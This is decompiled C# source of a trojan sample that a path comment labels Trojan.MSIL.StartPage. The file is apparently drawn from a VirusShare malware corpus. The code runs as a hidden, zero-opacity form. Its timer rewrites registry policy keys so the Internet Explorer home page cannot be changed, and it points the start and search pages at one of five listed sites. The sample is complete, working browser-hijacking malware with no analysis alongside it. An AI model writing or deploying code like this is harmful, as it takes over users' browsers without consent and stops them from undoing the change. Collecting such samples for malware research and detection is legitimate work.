// Decompiled with JetBrains decompiler
// Type: Messenger.Form1
// Assembly: messenger, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 679710B3-CFE3-4515-87F4-FC2C584F7D5F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.StartPage.k-37060bb669eaf53da64ddda441defe50856543e87385ba28f91e62743d7479a6.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Messenger
{
  public class Form1 : Form
  {
    private IContainer components = (IContainer) null;
    private Timer timer1;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.timer1 = new Timer(this.components);
      this.SuspendLayout();
      this.timer1.Interval = 360000;
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 273);
      this.ControlBox = false;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    public Form1() => this.InitializeComponent();

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Hide();
      this.timer1.Enabled = true;
    }

    private void timer1_Tick(object sender, EventArgs e) => this.blockExplorer();

    private void blockExplorer()
    {
      string str = new string[5]
      {
        "http://www.proarama.com",
        "http://www.plustvarama.com",
        "http://www.traramayeri.net",
        "http://www.fixarabul.com",
        "http://www.fixarasana.com"
      }[new Random().Next(0, 5)];
      if (true)
      {
        Registry.LocalMachine.OpenSubKey("Software\\Policies\\Microsoft\\", true).CreateSubKey("Internet Explorer");
        Registry.LocalMachine.OpenSubKey("Software\\Policies\\Microsoft\\Internet Explorer\\", true).CreateSubKey("Control Panel");
        Registry.LocalMachine.OpenSubKey("Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel", true).SetValue("HomePage", (object) "1");
        Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\", true).CreateSubKey("Internet Explorer");
        Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Internet Explorer\\", true).CreateSubKey("Control Panel");
        Registry.CurrentUser.OpenSubKey("Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel", true).SetValue("HomePage", (object) "1");
      }
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\main", true);
      registryKey.SetValue("Start Page", (object) str);
      registryKey.SetValue("Search Page", (object) str);
    }
  }
}
